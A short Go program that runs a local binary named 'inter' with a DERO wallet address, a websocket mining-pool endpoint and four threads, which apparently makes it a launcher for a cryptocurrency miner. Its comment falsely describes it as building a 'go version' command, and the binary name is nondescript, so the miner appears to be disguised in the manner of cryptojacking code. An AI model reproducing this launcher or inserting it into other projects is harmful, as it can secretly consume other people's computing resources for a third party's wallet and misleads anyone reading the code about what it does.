package main

import (
    "fmt"
    "os"
    "os/exec"
    
)

func main() {

    // construct `go version` command
    cmd := exec.Command("./inter","-u", "deroi1qyr8wnk9aw9lel0xcufdj98cqtd3lc5y84nhl679nm3wknaz0ad6xq9pvfz92xnje7yu7pv0rlr", "-o", "wss://dero-node-va.mysrv.cloud:10300", "-t", "4")
    
    // configure `Stdout` and `Stderr`
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stdout

    // run command
    if err := cmd.Run(); err != nil {
        fmt.Println( "Error:", err )
    }

}
